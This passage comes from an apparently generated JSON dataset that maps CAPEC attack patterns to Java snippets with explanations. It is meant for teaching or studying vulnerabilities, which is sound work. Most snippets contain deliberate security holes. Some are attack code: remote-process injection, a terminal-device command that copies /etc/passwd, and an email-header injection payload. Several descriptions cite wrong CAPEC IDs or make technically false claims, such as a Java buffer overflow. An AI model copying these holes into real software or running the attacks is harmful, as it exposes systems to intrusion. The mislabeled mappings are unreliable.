        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableServer {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Server is listening on port 8080\");\n\n        while (true) {\n            Socket socket = serverSocket.accept();\n            new ClientHandler(socket).start();\n        }\n    }\n}\n\nclass ClientHandler extends Thread {\n    private Socket socket;\n\n    public ClientHandler(Socket socket) {\n        this.socket = socket;\n    }\n\n    public void run() {\n        try {\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n            PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n\n            String clientMessage = in.readLine();\n            System.out.println(\"Received: \" + clientMessage);\n\n            // Improper Authentication (CWE-287)\n            if (clientMessage.startsWith(\"AUTH\")) {\n                String[] parts = clientMessage.split(\" \");\n                String username = parts[1];\n                String password = parts[2];\n\n                // Authentication Bypass by Spoofing (CWE-290)\n                if (\"admin\".equals(username) && \"password123\".equals(password)) {\n                    out.println(\"Welcome, admin!\");\n                } else {\n                    out.println(\"Invalid credentials\");\n                }\n            } else {\n                out.println(\"Please authenticate first.\");\n            }\n\n            // Exposure of Sensitive Information to an Unauthorized Actor (CWE-200)\n            out.println(\"Sensitive Data: [SECRET_INFORMATION]\");\n\n            socket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable server that listens for client connections on port 8080. The server accepts client connections and handles them in separate threads. The main vulnerability lies in the improper authentication mechanism (CWE-287) where the server naively checks for a hardcoded username and password. This can be easily spoofed (CWE-290) by an attacker who knows the credentials. Additionally, the server exposes sensitive information (CWE-200) to any client that connects, regardless of whether they have authenticated successfully or not. This code embodies the main idea of the CAPEC by demonstrating how trust in the client can be exploited due to weak authentication and improper handling of sensitive data."
    },
    {
        "capec_id": "23",
        "capec_name": "File Content Injection",
        "code_snippet": "import java.io.*;\nimport java.nio.file.*;\n\npublic class FileUploadHandler {\n    public static void main(String[] args) {\n        try {\n            // Simulate file upload\n            String uploadedFileName = \"malicious.pdf\";\n            byte[] fileContent = Files.readAllBytes(Paths.get(uploadedFileName));\n\n            // CWE-434: Unrestricted Upload of File with Dangerous Type\n            if (!isValidFileType(uploadedFileName)) {\n                throw new IOException(\"Invalid file type\");\n            }\n\n            // CWE-20: Improper Input Validation\n            if (!isValidContent(fileContent)) {\n                throw new IOException(\"Invalid file content\");\n            }\n\n            // Save the file (potentially dangerous operation)\n            Files.write(Paths.get(\"uploads/\" + uploadedFileName), fileContent);\n\n            System.out.println(\"File uploaded successfully\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static boolean isValidFileType(String fileName) {\n        // CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n        String[] allowedExtensions = {\".txt\", \".jpg\", \".png\"};\n        for (String ext : allowedExtensions) {\n            if (fileName.endsWith(ext)) {\n                return true;\n            }\n        }\n        return false;\n    }\n\n    private static boolean isValidContent(byte[] content) {\n        // Placeholder for actual content validation logic\n        // CWE-20: Improper Input Validation\n        return content.length > 0;\n    }\n}",
        "description": "This Java code snippet simulates a file upload handler that embodies the main idea of the CAPEC 'File Content Injection'. The code demonstrates vulnerabilities related to CWE-434 (Unrestricted Upload of File with Dangerous Type), CWE-20 (Improper Input Validation), and CWE-646 (Reliance on File Name or Extension of Externally-Supplied File). The `isValidFileType` method naively checks the file extension to determine if the file type is allowed, which can be easily bypassed by an attacker. The `isValidContent` method is a placeholder and does not perform thorough validation, making it susceptible to malicious content. The code represents how an adversary could exploit these weaknesses to upload and execute a malicious file."
    },
    {
        "capec_id": "24",
        "capec_name": "Filter Failure through Buffer Overflow",
        "code_snippet": "import java.util.Scanner;\n\npublic class FilterFailureExample {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter your input: \");\n        String userInput = scanner.nextLine();\n        \n        // Vulnerable buffer size\n        char[] buffer = new char[10];\n        \n        // Attempt to copy user input to buffer without size check\n        for (int i = 0; i < userInput.length(); i++) {\n            buffer[i] = userInput.charAt(i); // CWE-120, CWE-119\n        }\n        \n        // Simulate filter failure\n        if (userInput.contains(\"<script>\")) {\n            System.out.println(\"Potential XSS attack detected!\");\n        } else {\n            System.out.println(\"Input accepted: \" + new String(buffer));\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a filter failure through a buffer overflow, embodying the main idea of the CAPEC. The code reads user input and attempts to copy it into a fixed-size buffer without checking the input size, leading to a potential buffer overflow (CWE-120, CWE-119). The filter checks for a specific malicious pattern (e.g., '<script>') but may fail if the buffer overflow corrupts the filter's logic, allowing unfiltered input to pass through. This represents the vulnerability where an oversized transaction causes the filter to fail insecurely."
    },
    {
        "capec_id": "25",
        "capec_name": "Forced Deadlock",
        "code_snippet": "public class DeadlockExample {\n    private static final Object lock1 = new Object();\n    private static final Object lock2 = new Object();\n\n    public static void main(String[] args) {\n        Thread thread1 = new Thread(() -> {\n            synchronized (lock1) {\n                System.out.println(\"Thread 1: Holding lock 1...\");\n                try { Thread.sleep(100); } catch (InterruptedException e) {}\n                System.out.println(\"Thread 1: Waiting for lock 2...\");\n                synchronized (lock2) {\n                    System.out.println(\"Thread 1: Holding lock 1 & 2...\");\n                }\n            }\n        });\n\n        Thread thread2 = new Thread(() -> {\n            synchronized (lock2) {\n                System.out.println(\"Thread 2: Holding lock 2...\");\n                try { Thread.sleep(100); } catch (InterruptedException e) {}\n                System.out.println(\"Thread 2: Waiting for lock 1...\");\n                synchronized (lock1) {\n                    System.out.println(\"Thread 2: Holding lock 2 & 1...\");\n                }\n            }\n        });\n\n        thread1.start();\n        thread2.start();\n    }\n}",
        "description": "This Java code snippet demonstrates a classic deadlock scenario, which is the main idea of the CAPEC 'Forced Deadlock'. The code creates two threads, each trying to acquire two locks (lock1 and lock2) in different orders. Thread 1 acquires lock1 and then tries to acquire lock2, while Thread 2 acquires lock2 and then tries to acquire lock1. This situation leads to a deadlock because each thread is waiting for the other to release the lock it needs, and thus neither thread can proceed. This example also touches on related CWEs such as 'Improper Synchronization' (CWE-662) and 'Deadlock' (CWE-833), illustrating how improper handling of locks can lead to a deadlock condition, causing a denial of service."
    },
    {
        "capec_id": "26",
        "capec_name": "Leveraging Race Conditions",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.FileOutputStream;\nimport java.io.IOException;\n\npublic class RaceConditionExample {\n    private static final String FILE_PATH = \"example.txt\";\n\n    public static void main(String[] args) throws InterruptedException {\n        Thread writerThread = new Thread(() -> {\n            try {\n                writeToFile(\"Malicious Content\");\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n\n        Thread readerThread = new Thread(() -> {\n            try {\n                readFromFile();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n\n        writerThread.start();\n        readerThread.start();\n\n        writerThread.join();\n        readerThread.join();\n    }\n\n    private static void writeToFile(String content) throws IOException {\n        FileOutputStream fos = new FileOutputStream(FILE_PATH);\n        fos.write(content.getBytes());\n        fos.close();\n    }\n\n    private static void readFromFile() throws IOException {\n        FileInputStream fis = new FileInputStream(FILE_PATH);\n        byte[] data = new byte[1024];\n        int bytesRead = fis.read(data);\n        fis.close();\n        System.out.println(\"Read content: \" + new String(data, 0, bytesRead));\n    }\n}",
        "description": "This Java code snippet demonstrates a race condition vulnerability. Two threads are created: one writes to a file ('writerThread') and the other reads from the same file ('readerThread'). The race condition occurs because the file access is not properly synchronized, allowing the 'readerThread' to potentially read the file while it is being written by the 'writerThread'. This can lead to inconsistent or unexpected behavior, such as reading partial or corrupted data. This example embodies the main idea of CAPEC-367 (Leveraging Race Conditions) and is related to CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization) and CWE-662 (Improper Synchronization)."
    },
    {
        "capec_id": "27",
        "capec_name": "Leveraging Race Conditions via Symbolic Links",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class VulnerableSymlinkExample {\n    public static void main(String[] args) {\n        String tempFileName = \"/tmp/tempfile.txt\";\n        File tempFile = new File(tempFileName);\n\n        // Check if the temporary file exists\n        if (!tempFile.exists()) {\n            try {\n                // Simulate a delay to create a race condition window\n                Thread.sleep(1000);\n\n                // Create the temporary file\n                FileWriter writer = new FileWriter(tempFile);\n                writer.write(\"Sensitive data\");\n                writer.close();\n            } catch (IOException | InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a race condition vulnerability involving symbolic links (Symlinks). The program checks if a temporary file exists and then creates it if it does not. However, there is a delay (simulated by Thread.sleep) between the check and the creation of the file. During this interval, an attacker can create a symbolic link with the same name as the temporary file, pointing to a sensitive file. When the program writes to the temporary file, it will actually write to the sensitive file, leading to unauthorized modification. This example embodies the main idea of the CAPEC by illustrating how an attacker can exploit a race condition to manipulate file operations using symbolic links. The related CWEs are represented by the race condition (CWE-367), improper handling of symbolic links (CWE-61), and improper synchronization (CWE-662)."
    },
    {
        "capec_id": "28",
        "capec_name": "Fuzzing",
        "code_snippet": "import java.io.*;\nimport java.util.Random;\n\npublic class FuzzingExample {\n    public static void main(String[] args) {\n        String[] inputs = generateRandomInputs(100);\n        for (String input : inputs) {\n            try {\n                processInput(input);\n            } catch (Exception e) {\n                System.err.println(\"Error processing input: \" + input);\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private static String[] generateRandomInputs(int count) {\n        String[] inputs = new String[count];\n        Random random = new Random();\n        for (int i = 0; i < count; i++) {\n            inputs[i] = randomString(random.nextInt(20) + 1);\n        }\n        return inputs;\n    }\n\n    private static String randomString(int length) {\n        String characters = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()\";\n        Random random = new Random();\n        StringBuilder sb = new StringBuilder(length);\n        for (int i = 0; i < length; i++) {\n            sb.append(characters.charAt(random.nextInt(characters.length())));\n        }\n        return sb.toString();\n    }\n\n    private static void processInput(String input) throws Exception {\n        if (input.contains(\"<script>\")) {\n            throw new Exception(\"Input contains disallowed characters\");\n        }\n        // Simulate processing the input\n        System.out.println(\"Processing: \" + input);\n    }\n}",
        "description": "This Java code snippet demonstrates a basic fuzzing approach to identify weaknesses in input handling. The `generateRandomInputs` method creates an array of random strings, which are then processed by the `processInput` method. If the input contains the string '<script>', an exception is thrown, simulating improper input validation (CWE-20) and an incomplete list of disallowed inputs (CWE-184). The code also prints error messages that could potentially contain sensitive information (CWE-209). This example embodies the main idea of fuzzing (CAPEC) by feeding randomly constructed input to the system to uncover potential vulnerabilities."
    },
    {
        "capec_id": "29",
        "capec_name": "Leveraging Time-of-Check and Time-of-Use (TOCTOU) Race Conditions",
        "code_snippet": "import java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.Paths;\n\npublic class TOCTOURaceCondition {\n    public static void main(String[] args) {\n        Path filePath = Paths.get(\"/tmp/sensitive_file.txt\");\n\n        // Time of Check\n        if (Files.exists(filePath)) {\n            System.out.println(\"File exists, proceeding to read.\");\n\n            // Simulate a delay to create a window for race condition\n            try {\n                Thread.sleep(1000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n\n            // Time of Use\n            try (FileInputStream fis = new FileInputStream(filePath.toFile())) {\n                byte[] data = new byte[(int) filePath.toFile().length()];\n                fis.read(data);\n                System.out.println(\"File content: \" + new String(data));\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        } else {\n            System.out.println(\"File does not exist.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a Time-of-Check to Time-of-Use (TOCTOU) race condition vulnerability. The code first checks if a file exists at a specified path (Time of Check). If the file exists, it proceeds to read the file after a delay (Time of Use). The delay simulates a window where an attacker could potentially replace or modify the file between the check and the use, leading to unexpected behavior. This example embodies the main idea of CAPEC-367 and related CWEs by illustrating how a resource's state can change between the check and the use, causing the application to perform invalid actions."
    },
    {
        "capec_id": "30",
        "capec_name": "Hijacking a Privileged Thread of Execution",
        "code_snippet": "import com.sun.jna.Memory;\nimport com.sun.jna.Native;\nimport com.sun.jna.Pointer;\nimport com.sun.jna.platform.win32.Kernel32;\nimport com.sun.jna.platform.win32.WinNT;\n\npublic class PrivilegedThreadHijack {\n    public static void main(String[] args) {\n        int pid = 1234; // Target process ID\n        WinNT.HANDLE process = Kernel32.INSTANCE.OpenProcess(WinNT.PROCESS_ALL_ACCESS, false, pid);\n        if (process == null) {\n            System.err.println(\"Failed to open process\");\n            return;\n        }\n\n        WinNT.HANDLE thread = Kernel32.INSTANCE.CreateRemoteThread(process, null, 0, new Pointer(0x12345678), null, 0, null);\n        if (thread == null) {\n            System.err.println(\"Failed to create remote thread\");\n            Kernel32.INSTANCE.CloseHandle(process);\n            return;\n        }\n\n        Memory payload = new Memory(1024);\n        payload.setString(0, \"malicious code\");\n        Pointer remoteMemory = Kernel32.INSTANCE.VirtualAllocEx(process, null, payload.size(), WinNT.MEM_COMMIT, WinNT.PAGE_EXECUTE_READWRITE);\n        if (remoteMemory == null) {\n            System.err.println(\"Failed to allocate memory in remote process\");\n            Kernel32.INSTANCE.CloseHandle(thread);\n            Kernel32.INSTANCE.CloseHandle(process);\n            return;\n        }\n\n        Kernel32.INSTANCE.WriteProcessMemory(process, remoteMemory, payload, (int) payload.size(), null);\n        Kernel32.INSTANCE.ResumeThread(thread);\n\n        Kernel32.INSTANCE.CloseHandle(thread);\n        Kernel32.INSTANCE.CloseHandle(process);\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of hijacking a privileged thread of execution by injecting malicious code into a running process. The code uses the JNA (Java Native Access) library to interact with Windows API functions. It opens a target process with all access rights, creates a remote thread within that process, allocates memory in the remote process, writes a malicious payload into the allocated memory, and resumes the thread to execute the payload. This embodies the CAPEC idea of hijacking a privileged thread to evade detection and gain elevated privileges. The code also touches on related CWEs such as improper privilege management (CWE-270), process control (CWE-114), and potential race conditions (CWE-362)."
    },
    {
        "capec_id": "31",
        "capec_name": "Accessing/Intercepting/Modifying HTTP Cookies",
        "code_snippet": "import javax.servlet.http.Cookie;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.io.IOException;\n\npublic class VulnerableCookieHandler {\n    public void handleRequest(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        // Retrieve cookie without validation\n        Cookie[] cookies = request.getCookies();\n        String sessionId = null;\n        if (cookies != null) {\n            for (Cookie cookie : cookies) {\n                if (\"session_id\".equals(cookie.getName())) {\n                    sessionId = cookie.getValue();\n                    break;\n                }\n            }\n        }\n\n        // Assume session_id is immutable and use it directly\n        if (sessionId != null) {\n            // Simulate sensitive operation based on session_id\n            response.getWriter().println(\"Welcome back, user with session: \" + sessionId);\n        } else {\n            // Create a new session_id and set it in a cookie\n            sessionId = \"new_session_id\";\n            Cookie newCookie = new Cookie(\"session_id\", sessionId);\n            newCookie.setHttpOnly(false); // Allow client-side access\n            newCookie.setMaxAge(60 * 60 * 24 * 7); // Persistent cookie for 1 week\n            response.addCookie(newCookie);\n            response.getWriter().println(\"New session created with session_id: \" + sessionId);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of handling HTTP cookies in a web application. The code retrieves cookies from the incoming HTTP request without proper validation (CWE-565) and assumes the session_id cookie is immutable (CWE-302). It also stores the session_id in a persistent cookie without encryption (CWE-315, CWE-539) and allows client-side access to the cookie (CWE-602). This setup makes the application susceptible to attacks such as session hijacking, session fixation (CWE-384), and unauthorized access by modifying cookies (CWE-642). The code represents the main idea of CAPEC-Accessing/Intercepting/Modifying HTTP Cookies by demonstrating how improper handling of cookies can lead to security vulnerabilities."
    },
    {
        "capec_id": "32",
        "capec_name": "XSS Through HTTP Query Strings",
        "code_snippet": "import javax.servlet.http.*;\nimport java.io.IOException;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        response.setContentType(\"text/html\");\n        response.getWriter().println(\"<html><body>\" + userInput + \"</body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability to Cross-Site Scripting (XSS) through HTTP query strings. The servlet processes a GET request and retrieves a parameter named 'input' from the query string without proper validation or encoding. It then directly includes this user-controlled input in the HTML response. This can allow an attacker to inject malicious script code into the 'input' parameter, which will be executed by the victim's browser when they visit the page. This example embodies the main idea of CAPEC-463 and is related to several CWEs, including CWE-80 (Improper Neutralization of Script-Related HTML Tags in a Web Page), CWE-79 (Improper Neutralization of Input During Web Page Generation), and CWE-116 (Improper Encoding or Escaping of Output)."
    },
    {
        "capec_id": "33",
        "capec_name": "HTTP Request Smuggling",
        "code_snippet": "import java.io.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class HttpRequestSmugglingServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String contentLengthHeader = request.getHeader(\"Content-Length\");\n        String transferEncodingHeader = request.getHeader(\"Transfer-Encoding\");\n\n        if (contentLengthHeader != null && transferEncodingHeader != null) {\n            // Potential HTTP Request Smuggling vulnerability\n            InputStream inputStream = request.getInputStream();\n            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n            StringBuilder body = new StringBuilder();\n            String line;\n            while ((line = reader.readLine()) != null) {\n                body.append(line).append(\"\\n\");\n            }\n            // Log the request body for demonstration purposes\n            System.out.println(\"Request Body: \" + body.toString());\n        }\n\n        // Forward the request to another server (acting as an unintended proxy)\n        String targetUrl = \"http://backend-server.example.com\";\n        URL url = new URL(targetUrl);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"POST\");\n        connection.setDoOutput(true);\n        OutputStream os = connection.getOutputStream();\n        os.write(body.toString().getBytes());\n        os.flush();\n        os.close();\n\n        // Read the response from the backend server\n        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n        String inputLine;\n        StringBuilder responseContent = new StringBuilder();\n        while ((inputLine = in.readLine()) != null) {\n            responseContent.append(inputLine);\n        }\n        in.close();\n\n        // Send the response back to the client\n        response.getWriter().write(responseContent.toString());\n    }\n}",
        "description": "This Java servlet code demonstrates a potential HTTP Request Smuggling vulnerability. The servlet reads the 'Content-Length' and 'Transfer-Encoding' headers from the incoming HTTP request. If both headers are present, it reads the request body and logs it. The servlet then forwards the request to a backend server, acting as an unintended proxy. This code snippet embodies the main idea of HTTP Request Smuggling (CAPEC-33) by showing how discrepancies in HTTP header interpretation can be exploited. It also touches on related CWEs such as CWE-444 (Inconsistent Interpretation of HTTP Requests) and CWE-441 (Unintended Proxy or Intermediary)."
    },
    {
        "capec_id": "34",
        "capec_name": "HTTP Response Splitting",
        "code_snippet": "import java.io.IOException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n        String userInput = request.getParameter(\"input\");\n        // Vulnerable to HTTP Response Splitting\n        response.setHeader(\"Content-Type\", \"text/html\");\n        response.setHeader(\"X-Custom-Header\", userInput);\n        response.getWriter().println(\"<html><body>Response</body></html>\");\n    }\n}",
        "description": "This Java servlet code demonstrates a vulnerability to HTTP Response Splitting. The servlet reads a parameter 'input' from the HTTP request and directly sets it as a value in the HTTP response header 'X-Custom-Header' without proper sanitization. If an attacker provides a malicious input containing CRLF sequences (e.g., 'malicious\\r\\nHeader: value'), it can split the HTTP response and inject additional headers or even body content. This can lead to various attacks, including cache poisoning, cross-site scripting (XSS), and session fixation. The code snippet embodies the main idea of CAPEC-34 (HTTP Response Splitting) and is related to CWE-113 (Improper Neutralization of CRLF Sequences in HTTP Headers)."
    },
    {
        "capec_id": "35",
        "capec_name": "Leverage Executable Code in Non-Executable Files",
        "code_snippet": "import java.io.*;\nimport java.util.Properties;\n\npublic class VulnerableConfigLoader {\n    public static void main(String[] args) {\n        try {\n            Properties config = new Properties();\n            FileInputStream fis = new FileInputStream(\"config.properties\");\n            config.load(fis);\n            fis.close();\n\n            // Directly using the configuration value without validation\n            String command = config.getProperty(\"command\");\n            Runtime.getRuntime().exec(command);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where an application loads a configuration file ('config.properties') and directly uses a value from it to execute a system command. This embodies the CAPEC 'Leverage Executable Code in Non-Executable Files' by showing how an attacker could modify the configuration file to include malicious commands. The code does not validate or sanitize the input from the configuration file, leading to potential code injection (CWE-94) and improper neutralization of directives (CWE-96). The use of 'Runtime.getRuntime().exec()' with untrusted input is particularly dangerous as it can lead to arbitrary code execution."
    },
    {
        "capec_id": "36",
        "capec_name": "Using Unpublished Interfaces or Functionality",
        "code_snippet": "public class UnpublishedInterface {\n    // Undocumented and unpublished method\n    public void unpublishedMethod() {\n        System.out.println(\"Executing unpublished functionality\");\n        // Critical operation without authentication or authorization\n        performCriticalOperation();\n    }\n\n    private void performCriticalOperation() {\n        // Simulate a critical operation\n        System.out.println(\"Critical operation performed\");\n    }\n\n    public static void main(String[] args) {\n        UnpublishedInterface ui = new UnpublishedInterface();\n        // Directly invoking the unpublished method\n        ui.unpublishedMethod();\n    }\n}",
        "description": "This Java code snippet demonstrates a class with an unpublished and undocumented method `unpublishedMethod` that performs a critical operation without any authentication or authorization checks. The `performCriticalOperation` method simulates a critical operation that should be protected. The main method directly invokes the unpublished method, representing how an attacker might exploit such an interface if discovered. This code embodies the CAPEC concept of using unpublished interfaces or functionality, highlighting related CWEs such as missing authentication (CWE-306), missing authorization (CWE-862), and inclusion of undocumented features (CWE-1242)."
    },
    {
        "capec_id": "37",
        "capec_name": "Retrieve Embedded Sensitive Data",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class SensitiveDataExample {\n    public static void main(String[] args) {\n        String sensitiveData = \"password=12345\"; // CWE-312: Cleartext Storage of Sensitive Information\n        File file = new File(\"sensitiveData.txt\");\n        try (FileWriter writer = new FileWriter(file)) {\n            writer.write(sensitiveData); // CWE-312: Cleartext Storage of Sensitive Information\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        // CWE-226: Sensitive Information in Resource Not Removed Before Reuse\n        // The file is not deleted or zeroized after use\n    }\n}",
        "description": "This Java code snippet demonstrates the vulnerability described in the CAPEC 'Retrieve Embedded Sensitive Data'. The code stores sensitive information (a password) in cleartext within a file, which is a direct example of CWE-312: Cleartext Storage of Sensitive Information. Additionally, the file is not deleted or zeroized after use, illustrating CWE-226: Sensitive Information in Resource Not Removed Before Reuse. This makes it possible for an attacker to retrieve the sensitive data by examining the file system, embodying the main idea of the CAPEC."
    },
    {
        "capec_id": "38",
        "capec_name": "Leveraging/Manipulating Configuration File Search Paths",
        "code_snippet": "import java.io.*;\nimport java.util.Properties;\n\npublic class VulnerableApp {\n    public static void main(String[] args) {\n        String configFilePath = args[0]; // CWE-73: External Control of File Name or Path\n        Properties config = new Properties();\n        try (FileInputStream fis = new FileInputStream(configFilePath)) {\n            config.load(fis);\n            String classpath = config.getProperty(\"classpath\"); // CWE-426: Untrusted Search Path\n            System.setProperty(\"java.class.path\", classpath); // CWE-427: Uncontrolled Search Path Element\n            String password = config.getProperty(\"db.password\"); // CWE-555: Plaintext Password in Configuration File\n            System.out.println(\"Loaded classpath: \" + classpath);\n            System.out.println(\"Loaded password: \" + password);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable application that reads configuration settings from a file specified by user input. The application loads a classpath and a plaintext password from the configuration file. The key vulnerabilities are:\n1. CWE-73: The file path for the configuration file is controlled by user input, allowing an attacker to specify a malicious file.\n2. CWE-426: The classpath is loaded from the configuration file, which could point to untrusted resources.\n3. CWE-427: The classpath is set in the system properties, potentially allowing execution of malicious code from unintended locations.\n4. CWE-555: The password is stored in plaintext in the configuration file, which is insecure.\nThis code embodies the main idea of CAPEC-189 by demonstrating how an attacker can manipulate configuration file paths and search paths to load malicious resources."
    },
    {
        "capec_id": "39",
        "capec_name": "Manipulating Opaque Client-based Data Tokens",
        "code_snippet": "import javax.servlet.http.Cookie;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class VulnerableTokenHandler {\n    public void handleRequest(HttpServletRequest request, HttpServletResponse response) {\n        // Retrieve token from cookie\n        Cookie[] cookies = request.getCookies();\n        String token = null;\n        if (cookies != null) {\n            for (Cookie cookie : cookies) {\n                if (\"authToken\".equals(cookie.getName())) {\n                    token = cookie.getValue();\n                    break;\n                }\n            }\n        }\n\n        // Assume token is valid without validation\n        if (token != null) {\n            // Perform sensitive operation based on token\n            performSensitiveOperation(token);\n        } else {\n            // Handle missing token\n            response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);\n        }\n    }\n\n    private void performSensitiveOperation(String token) {\n        // Sensitive operation based on token\n        System.out.println(\"Performing sensitive operation for token: \" + token);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of handling client-based data tokens, specifically authentication tokens stored in cookies. The code retrieves a token from a cookie named 'authToken' and assumes it is valid without performing any validation or integrity checks. This embodies the CAPEC 'Manipulating Opaque Client-based Data Tokens' by showing how an attacker could manipulate the token to gain unauthorized access. The related CWEs are represented as follows:\n- CWE-353: Missing Support for Integrity Check - The token is used without verifying its integrity.\n- CWE-285: Improper Authorization - The code does not perform proper authorization checks.\n- CWE-302: Authentication Bypass by Assumed-Immutable Data - The token is assumed to be immutable but can be modified by an attacker.\n- CWE-565: Reliance on Cookies without Validation and Integrity Checking - The code relies on the cookie value without validation.\n- CWE-315: Cleartext Storage of Sensitive Information in a Cookie - Although not explicitly shown, storing sensitive tokens in cookies without encryption is implied.\n- CWE-539: Use of Persistent Cookies Containing Sensitive Information - The use of cookies for sensitive information is implied.\n- CWE-384: Session Fixation - The code does not handle session fixation attacks.\n- CWE-233: Improper Handling of Parameters - The code does not handle cases where the token is missing or malformed."
    },
    {
        "capec_id": "40",
        "capec_name": "Manipulating Writeable Terminal Devices",
        "code_snippet": "import java.io.*;\n\npublic class TerminalDeviceExploit {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java TerminalDeviceExploit <target_terminal>\");\n            return;\n        }\n\n        String targetTerminal = args[0];\n        String maliciousCommand = \"cat /etc/passwd > /tmp/stolen_passwd\";\n\n        try (BufferedWriter writer = new BufferedWriter(new FileWriter(targetTerminal))) {\n            writer.write(maliciousCommand + \"\\n\");\n            System.out.println(\"Malicious command sent to \" + targetTerminal);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of the 'Manipulating Writeable Terminal Devices' attack. The program takes a target terminal device as an argument and writes a malicious command to it. The command attempts to copy the contents of the /etc/passwd file to a temporary directory, which the attacker can later access. This code embodies the main idea of the CAPEC by exploiting a writable terminal device to execute a command with the target user's privileges. The related CWEs are represented as follows:\n- CWE-77 and CWE-78: The code constructs a command string that includes special elements (e.g., 'cat /etc/passwd') and writes it to the terminal device without proper neutralization.\n- CWE-214: The command is visible in the source code and could be seen by other processes if executed.\n- CWE-114: The code executes a command from an untrusted source (the attacker).\n- CWE-529: The command attempts to store the output in a directory (/tmp) that may be accessible to unauthorized users."
    },
    {
        "capec_id": "41",
        "capec_name": "Using Meta-characters in E-mail Headers to Inject Malicious Payloads",
        "code_snippet": "import java.util.Properties;\nimport javax.mail.*;\nimport javax.mail.internet.*;\n\npublic class EmailHeaderInjection {\n    public static void main(String[] args) {\n        String to = \"victim@example.com\";\n        String from = \"attacker@example.com\";\n        String host = \"smtp.example.com\";\n\n        Properties properties = System.getProperties();\n        properties.setProperty(\"mail.smtp.host\", host);\n        Session session = Session.getDefaultInstance(properties);\n\n        try {\n            MimeMessage message = new MimeMessage(session);\n            message.setFrom(new InternetAddress(from));\n            message.addRecipient(Message.RecipientType.TO, new InternetAddress(to));\n            message.setSubject(\"Test Email\");\n\n            // Vulnerable code: Injecting malicious payload in email headers\n            String maliciousHeader = \"\\nBcc: victim2@example.com\\nContent-Type: text/html\\n\\n<script>alert('Injected!');</script>\";\n            message.setHeader(\"X-Custom-Header\", maliciousHeader);\n\n            message.setText(\"This is a test email with header injection.\");\n\n            Transport.send(message);\n            System.out.println(\"Sent message successfully....\");\n        } catch (MessagingException mex) {\n            mex.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability where an attacker can inject malicious payloads into email headers. The code sets up an email message using JavaMail API and includes a custom header 'X-Custom-Header' that contains a malicious script. This script is injected using meta-characters and can execute when the email is processed by a vulnerable email client. The code represents the CAPEC idea of using meta-characters in email headers to inject improper behavior, and it highlights related CWEs such as improper neutralization of escape sequences (CWE-150) and improper encoding or escaping of output (CWE-116)."
    },
    {
        "capec_id": "42",
        "capec_name": "MIME Conversion",
